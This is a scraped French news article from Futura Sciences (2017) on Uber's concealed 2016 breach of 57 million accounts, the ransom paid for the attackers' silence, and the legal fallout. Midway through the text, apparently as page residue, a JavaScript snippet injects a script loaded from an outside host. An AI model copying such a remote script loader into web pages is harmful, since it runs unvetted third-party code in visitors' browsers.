{"title": "Uber : les donnees de 57 millions d'utilisateurs piratees", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-11-22", "content": "Uber vient d'avouer qu'il avait ete victime d'un piratage massif fin 2016. Ce dernier a permis a des cyberdelinquants de derober une partie des donnees personnelles de 57 millions d'usagers et chauffeurs. Le service de VTC a cherche a etouffer l'affaire en acceptant d'acheter le silence des auteurs contre une rancon de 100.000 dollars. Ce qu'il faut retenir Uber est sur la sellette depuis plusieurs mois, tant pour ses pratiques commerciales que pour sa culture d'entreprise. Le service de VTC a ete victime d'un vol massif de donnees en octobre 2016 qu'il a choisi de cacher en payant une rancon de 100.000 dollars. L'entreprise s'expose desormais a des poursuites et des sanctions financieres potentiellement tres lourdes. Malgre sa puissance et sa renommee mondiale,  Uber  a prefere verser une rancon a des pirates informatique pour acheter leur silence et tenter d'etouffer une affaire tres embarrassante. Fin 2016, le service de  voiture  de transport avec chauffeur (VTC) a ete la cible d'une intrusion sur des  serveurs  heberges par GitHub qui a conduit au vol de donnees personnelles de 57 millions d'utilisateurs, dont pres de 7 millions de chauffeurs Uber. L'information vient seulement d'etre rendue publique par l'entreprise suite a un article de  Bloomberg  revelant qu'au moment des faits, Uber a accepte de verser une rancon de 100.000 dollars pour que les pirates detruisent les donnees derobees et gardent le silence sur cette affaire. Dans un communique de presse diffuse dans la foulee de ces revelations,  Dara Khosrowshahi , nouveau PDG d'Uber nomme en aout dernier, se livre a une operation  transparence  en donnant des details sur les conditions de ce piratage massif. Les donnees des 57 millions de comptes Uber qui ont ete compromis contenaient les noms, adresses de courrier electronique et numeros de telephone. Parmi les victimes, figurent donc 7 millions de chauffeurs Uber, dont 600.000 d'entre eux bases aux Etats-Unis ont vu leur numero de permis de conduire derobe. Uber assure aujourd'hui que les pirates n'ont pas mis la main sur des informations bancaires, numeros de securite sociale, dates de naissance ou historiques individuels des trajets. Dara Khosrowshahi a pris la direction d'Uber en aout dernier. Il a la lourde tache de sortir Uber de ses demeles judiciaires, de renouveler la culture d'entreprise et de preparer l'entree en bourse de la societe. (c) George Grinsted,  Wikimedia Commons , CC by-sa 2.0                       Uber a paye la rancon pour acheter le silence des cyberpirates Voici comment le  piratage  s'est deroule. Deux assaillants ont pu acceder a des comptes GitHub prives utilises par des developpeurs d'Uber et s'emparer d'identifiants et de  mots de passe . Ils ont ensuite utilise ces informations pour se connecter a un espace en ligne d'Uber sur le service  cloud  Amazon  Web  Services et sont tombes sur une  base de donnees  contenant les informations sur des clients et des chauffeurs. Ils ont alors pris contact avec l'entreprise pour la faire chanter et obtenir le paiement de la rancon.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Uber affirme que des mesures de securite ont ete immediatement prises pour securiser les donnees et les acces. Mais l'entreprise a choisi de taire l'incident alors que la loi americaine l'obligeait a communiquer l'information au public et aux autorites concernees. A l'epoque des faits, Uber venait juste de trouver un accord amiable avec le procureur general de New York sur une precedente affaire de vol de donnees et negociait avec la  Federal Trade Commission  au sujet de sa gestion des donnees des utilisateurs. Un contexte delicat qui a sans doute incite les responsables d'Uber a opter pour le mensonge. Des proces en cascade Face a cette situation, le nouveau patron d' Uber  tente d'eteindre l'incendie en annoncant une serie de mesures. Le directeur de la securite et l'un de ses adjoints ont ete licencies. Les chauffeurs dont le numero de permis de conduire a ete compromis ont ete prevenus et beneficient d'un programme de protection contre le vol d'identite. Mais les repercussions de cette affaire sont encore imprevisibles. Deja, Uber fait l'objet d'une  plainte  en recours collectif ( class action  en anglais) pour negligence qui vient d'etre deposee au nom des clients et chauffeurs  Uber  leses. De plus, le procureur general de New York a immediatement ouvert une enquete dans la foulee de ces revelations.  Uber risque de lourdes sanctions financieres. Un probleme de plus alors que l'entreprise est dans la tourmente depuis quelques mois. Aux Etats-Unis, plusieurs enquetes sont en cours pour des faits de corruption, de vol de propriete intellectuelle et d'usage de  logiciels  prohibes. L'entreprise fait l'objet d'une dizaine de proces et a ete mise a l'index pour sa culture interne jugee sexiste et brutale. En juin dernier, Travis Kalanick, cofondateur et PDG d'Uber, a ete pousse a la demission par les actionnaires, inquiets de voir la situation degenerer. ", "theme": "tech"}